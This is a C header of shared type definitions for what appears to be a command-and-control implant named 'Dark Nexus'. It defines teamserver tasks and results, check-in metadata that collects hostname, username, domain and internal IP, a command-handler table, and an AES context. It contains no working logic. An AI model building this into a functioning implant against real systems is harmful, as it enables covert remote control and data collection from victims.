#ifndef DN_TYPES_H
#define DN_TYPES_H

#include <windows.h>

/*
 * Dark Nexus shared type definitions
 */

// Task received from teamserver
typedef struct _DN_TASK {
    char    id[64];
    char    command[64];
    char*   args;
    DWORD   args_len;
} DN_TASK;

// Task result to send back
typedef struct _DN_TASK_RESULT {
    char    task_id[64];
    char    status[16];     // "completed" or "failed"
    char*   output;
    DWORD   output_len;
} DN_TASK_RESULT;

// Implant metadata for check-in
typedef struct _DN_METADATA {
    char    id[64];
    char    hostname[256];
    char    username[256];
    char    domain[256];
    char    internal_ip[64];
    char    os[128];
    char    arch[16];
    DWORD   pid;
    char    process_name[256];
    int     sleep;
    int     jitter;
} DN_METADATA;

// Check-in response from teamserver
typedef struct _DN_CHECKIN_RESPONSE {
    DN_TASK*    tasks;
    int         task_count;
} DN_CHECKIN_RESPONSE;

// Command handler function pointer
typedef BOOL (*DN_CMD_HANDLER)(DN_TASK* task, DN_TASK_RESULT* result);

// Command registration entry
typedef struct _DN_COMMAND {
    char            name[64];
    DN_CMD_HANDLER  handler;
} DN_COMMAND;

// AES context
typedef struct _DN_AES_CTX {
    BYTE    key[32];
    BYTE    iv[16];
} DN_AES_CTX;

#endif // DN_TYPES_H
